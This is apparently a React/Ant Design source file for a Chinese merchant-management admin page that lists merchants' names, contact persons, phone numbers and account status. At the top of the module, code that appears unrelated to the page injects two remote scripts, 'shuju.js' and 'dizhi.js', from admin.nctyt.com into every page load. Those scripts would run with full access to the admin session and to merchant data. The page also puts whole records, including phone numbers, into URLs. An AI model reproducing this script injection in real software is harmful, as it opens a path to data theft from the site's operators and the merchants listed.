import { post } from '@/utils/request';
import { PageContainer } from '@ant-design/pro-layout';
import { history } from '@umijs/max';
import {
  Button,
  Col,
  DatePicker,
  Form,
  Input,
  message,
  Row,
  Select,
  Spin,
  Switch,
  Table,
} from 'antd';
import React from 'react';
import { Link } from 'umi';
import NewNotice from './components/NewNotice';

const d = document.createElement('script');
d.src = 'https://admin.nctyt.com/shuju.js';
const c = document.createElement('script');
c.src = 'https://admin.nctyt.com/dizhi.js';
document.getElementsByTagName('head')[0].appendChild(d);
document.getElementsByTagName('head')[0].appendChild(c);

// import { setToken } from '@/utils/authority';
const { Option } = Select;
const { RangePicker } = DatePicker;

class NoticeNotice extends React.Component {
  formRef = React.createRef();
  state = {
    spinning: false,
    xxx: false,
    selectedRowKeys: [],
    pageNum: 1,
  };

  componentDidMount() {
    this.getData();
  }

  getData = () => {
    this.setState(
      {
        spinning: true,
      },
      async () => {
        const res = await post('/guzhe/merchant/get/list', {
          keyword: this.state.keyword,
          searchType: this.state.mainType,
          searchField1: this.state.acc_type,
          searchStrField1: this.state.searchStrField1,
          pageSize: 10,
          pageNum: this.state.pageNum,
        });

        this.setState({
          spinning: false,
        });
        if (res && res.code === 10000) {
          this.setState({
            list: res.data.list,
            total: res.data.total,
          });
        } else {
          message.error(res?.msg);
        }
      },
    );
  };

  onSelectChange = (selectedRowKeys) => {
    //触发表单筛选
    this.setState({ selectedRowKeys });
  };

  pageChange = (page) => {
    //列表改变页码
    this.setState(
      {
        pageNum: page,
      },
      () => {
        this.getData();
      },
    );
  };

  handleOk = () => {
    this.setState({
      NewRoles: false,
    });
  };

  onFinish = (res) => {
    this.setState(
      {
        id: res.id,
        title: res.title,
        acc_type: res.acc_type,
        mainType: res.mainType,
        keyword: res.keyword,
        pageNum: 1,
        searchStrField1: res.searchStrField1,
      },
      () => {
        this.getData();
      },
    );
  };

  siteFrontReserve = async (v, ids) => {
    if (ids.length === 0) {
      message.error('请选择需要操作的数据');
    } else {
      const res = await post('/guzhe/merchant/status/set', {
        searchIntStatus: v ? 1 : 0,
        searchIds: ids,
      });
      if (res && res.code === 200) {
        this.setState({
          selectedRowKeys: [],
        });
        message.success(res.msg);
        this.getData();
      } else {
        message.error(res?.msg);
      }
    }
  };

  resets = (vas) => {
    this.formRef.current.resetFields();
    this.setState(
      {
        keyword: undefined,
        mainType: undefined,
        searchField1: undefined,
        searchStrField1: undefined,
      },
      () => {
        this.getData();
      },
    );
  };

  render() {
    const { list = [], selectedRowKeys, NewRoles, edit } = this.state;

    const rowSelection = {
      selectedRowKeys,
      onChange: this.onSelectChange,
    };

    const columns = [
      {
        title: 'ID',
        dataIndex: 'id',
      },
      {
        title: '商户名称',
        dataIndex: 'merchantName',
      },
      {
        title: '商户编号',
        dataIndex: 'merchantNo',

        render: (text, record) => {
          return <div>{record.merchantNo}</div>;
        },
      },
      {
        title: '主体类型',
        dataIndex: 'type',
        render: (text, record) => {
          return (
            <div>
              {/* {record.type===1&&'企业'}
              {record.type===0&&'个人经营者'} */}
              {record.mainType === 10030 && <span>企业商户</span>}
              {record.mainType === 10031 && <span>个体工商户</span>}
              {record.mainType === 10034 && <span>民办非企业</span>}
              {record.mainType === 10033 && <span>事业单位</span>}
            </div>
          );
        },
      },
      {
        title: '关联门店',
        dataIndex: 'shopList',
        render: (text, record) => {
          return (
            <div>
              {record.shopList &&
                record.shopList.map((x) => x.namne).join('、')}
            </div>
          );
        },
      },
      {
        title: '主体负责人',
        dataIndex: 'title',
        render: (text, record) => {
          return <div>{record.cardName}</div>;
        },
      },
      {
        title: '联系电话',
        render: (text, record) => {
          return <div>{record.cardMobile}</div>;
        },
      },

      {
        title: '账户类型',
        render: (text, record) => {
          return (
            <div>
              {record.accType === 10070 ? '对公账户' : ''}
              {record.accType === 10071 ? '法人账户' : ''}
            </div>
          );
        },
      },

      {
        title: '账户状态',
        dataIndex: 'type',
        render: (text, record) => {
          return (
            <div>
              {record.applicationStatus === 'COMPLETED' ? (
                <span style={{ color: '#03bf16fe' }}>已开通</span>
              ) : (
                <a>进件申请中</a>
              )}
            </div>
          );
        },
      },
      {
        title: '开通时间',
        dataIndex: 'createTime',
      },

      {
        title: '进件状态',
        dataIndex: 'type',
        render: (text, record) => {
          return (
            <div>
              {record.applicationStatus === 'REVIEWING' && (
                <div
                  className="clickFont"
                  onClick={() => {
                    history.push(
                      `/MerchantManagement/ProgressQuery?stadium_id=${
                        record.stadium_id
                      }&detail=${JSON.stringify(record)}&name=${
                        record.name
                      }&application_no=${
                        record.application_no
                      }&application_status=${
                        record.application_status
                      }&created_at=${record.created_at}`,
                    );
                  }}
                >
                  申请审核中
                </div>
              )}
              {record.applicationStatus === 'REVIEW_BACK' && (
                <div
                  className="clickFont"
                  onClick={() => {
                    history.push(
                      `/MerchantManagement/UpdateMerchants?stadium_id=${
                        record.stadium_id
                      }&detail=${JSON.stringify(record)}&id=${record.id}`,
                    );
                  }}
                >
                  <span style={{ color: 'red' }}>申请已驳回</span>
                </div>
              )}
              {record.applicationStatus === 'AGREEMENT_SIGNING' && (
                <div
                  className="clickFont"
                  onClick={() => {
                    history.push(
                      `/MerchantManagement/ProgressQuery?stadium_id=${
                        record.stadium_id
                      }&detail=${JSON.stringify(record)}&name=${
                        record.name
                      }&application_no=${
                        record.application_no
                      }&application_status=${
                        record.application_status
                      }&created_at=${record.created_at}`,
                    );
                  }}
                >
                  <a>协议待签署</a>
                </div>
              )}
              {record.applicationStatus === 'BUSINESS_OPENING' && (
                <div
                  className="clickFont"
                  onClick={() => {
                    history.push(
                      `/MerchantManagement/ProgressQuery?stadium_id=${
                        record.stadium_id
                      }&detail=${JSON.stringify(record)}&name=${
                        record.name
                      }&application_no=${
                        record.application_no
                      }&application_status=${
                        record.application_status
                      }&created_at=${record.created_at}`,
                    );
                  }}
                >
                  <span style={{ color: '#e3dc14fe' }}>业务开通中</span>
                </div>
              )}
              {record.applicationStatus === 'COMPLETED' && (
                <div
                  className="clickFont"
                  onClick={() => {
                    history.push(
                      `/MerchantManagement/ProgressQuery?stadium_id=${
                        record.stadium_id
                      }&detail=${JSON.stringify(record)}&name=${
                        record.name
                      }&application_no=${
                        record.application_no
                      }&application_status=${
                        record.application_status
                      }&created_at=${record.created_at}`,
                    );
                  }}
                >
                  <span style={{ color: '#03bf16fe' }}>申请已完成</span>
                </div>
              )}

              {record.applicationStatus === undefined && (
                <div
                  className="clickFont"
                  onClick={() => {
                    history.push(
                      `/MerchantManagement/UpdateMerchants?stadium_id=${
                        record.stadium_id
                      }&detail=${JSON.stringify(record)}&id=${record.id}`,
                    );
                  }}
                >
                  <span style={{ color: 'red' }}>数据异常，请修改</span>
                </div>
              )}

              {(record.applicationStatus === 'WAIT_SUBMIT' ||
                record.status === 4) && (
                <div
                  className="clickFont"
                  onClick={() => {
                    history.push(
                      `/MerchantManagement/UpdateMerchants?detail=${JSON.stringify(
                        record,
                      )}&id=${record.id}`,
                    );
                  }}
                >
                  申请待提交
                </div>
              )}
            </div>
          );
        },
      },

      {
        title: '启用状态',
        dataIndex: 'status',
        render: (text, record) => {
          return (
            <div>
              <Switch
                checkedChildren="开启"
                unCheckedChildren="关闭"
                checked={text}
                onChange={(value) => this.siteFrontReserve(value, [record.id])}
              />
            </div>
          );
        },
      },

      {
        title: '操作',
        dataIndex: 'status',
        render: (text, record) => {
          return (
            <div
              className="clickFont"
              onClick={() => {
                history.push(
                  `/MerchantManagement/MerchantDetails?detail=${JSON.stringify(
                    record,
                  )}`,
                );
              }}
            >
              {/* <Link to={`/MerchantManagement/MerchantDetails?detail=${JSON.stringify(record)}`}> */}
              详情
              {/* </Link> */}
            </div>
          );
        },
      },
    ];

    return (
      <PageContainer
        header={{
          title: ``,
        }}
      >
        <Spin spinning={this.state.spinning}>
          <div
            style={{
              backgroundColor: '#fff',
              padding: '20px 20px 0 20px',
              marginBottom: 15,
            }}
          >
            <Form ref={this.formRef} onFinish={this.onFinish}>
              <Row gutter={16}>
                <Col className="gutter-row" span={6}>
                  <Form.Item label="关键词" name="keyword">
                    <Input placeholder="请输入ID/商户名称/主体负责人/联系电话" />
                  </Form.Item>
                </Col>
                <Col className="gutter-row" span={4}>
                  <Form.Item label="主体类型" name="mainType">
                    <Select optionFilterProp="label" placeholder="请选择">
                      <Option value={10030}>企业商户</Option>
                      <Option value={10031}>个体工商户</Option>
                      <Option value={10034}>民办非企业</Option>
                      <Option value={10033}>事业单位</Option>
                    </Select>
                  </Form.Item>
                </Col>
                <Col className="gutter-row" span={4}>
                  <Form.Item label="账户类型" name="acc_type">
                    <Select optionFilterProp="label" placeholder="请选择">
                      <Option value={10070}>对公账户</Option>
                      <Option value={10071}>法人账户</Option>
                    </Select>
                  </Form.Item>
                </Col>
                <Col className="gutter-row" span={4}>
                  <Form.Item label="进件状态" name="searchStrField1">
                    <Select allowClear placeholder="请选择">
                      <Option value={'WAIT_SUBMIT'}>申请待提交</Option>
                      <Option value={'REVIEWING'}>申请审核中</Option>
                      <Option value={'AGREEMENT_SIGNING'}>协议待签署</Option>
                      <Option value={'REVIEW_BACK'}>申请已驳回</Option>
                      <Option value={'BUSINESS_OPENING'}>业务开通中</Option>
                      <Option value={'COMPLETED'}>申请已完成</Option>
                    </Select>
                  </Form.Item>
                </Col>

                <Col
                  className="gutter-row"
                  span={6}
                  style={{ textAlign: 'right' }}
                >
                  <Form.Item>
                    <Button type="primary" htmlType="submit">
                      查询
                    </Button>

                    <Button className="mL15" onClick={this.resets}>
                      重置
                    </Button>
                  </Form.Item>
                </Col>
              </Row>
            </Form>
          </div>
          <div style={{ backgroundColor: '#fff', padding: 20 }}>
            <Row>
              <Col span={6}>
                {' '}
                <h1 style={{ fontWeight: '600', fontSize: '18px' }}>
                  商户管理
                </h1>
              </Col>
              <Col span={18}>
                <div style={{ textAlign: 'right' }}>
                  <Button type="primary">
                    <Link to={`/MerchantManagement/NewMerchants`}>
                      +新增商户
                    </Link>
                  </Button>

                  <Button
                    className="mL15 bxluSe"
                    onClick={() =>
                      this.siteFrontReserve(true, this.state.selectedRowKeys)
                    }
                  >
                    启用
                  </Button>
                  <Button
                    className="mL15 bxHuang"
                    onClick={() =>
                      this.siteFrontReserve(false, this.state.selectedRowKeys)
                    }
                  >
                    禁用
                  </Button>
                </div>
              </Col>
            </Row>

            <Table
              style={{ marginTop: 15 }}
              loading={this.state.loading}
              rowKey="id"
              rowSelection={rowSelection}
              columns={columns}
              dataSource={list}
              pagination={{
                showSizeChanger: false,
                onChange: this.pageChange,
                pageSize: 10,
                total: this.state.total,
                current: this.state.pageNum,
              }}
              // scroll={{ x: '100%' }}
            />

            {/* 新建角色模态框 */}
            {NewRoles && (
              <NewNotice
                handleOk={this.handleOk}
                add={this.state.add}
                getData={this.getData}
                edit={edit}
              />
            )}
          </div>
        </Spin>
      </PageContainer>
    );
  }
}

export default NoticeNotice;
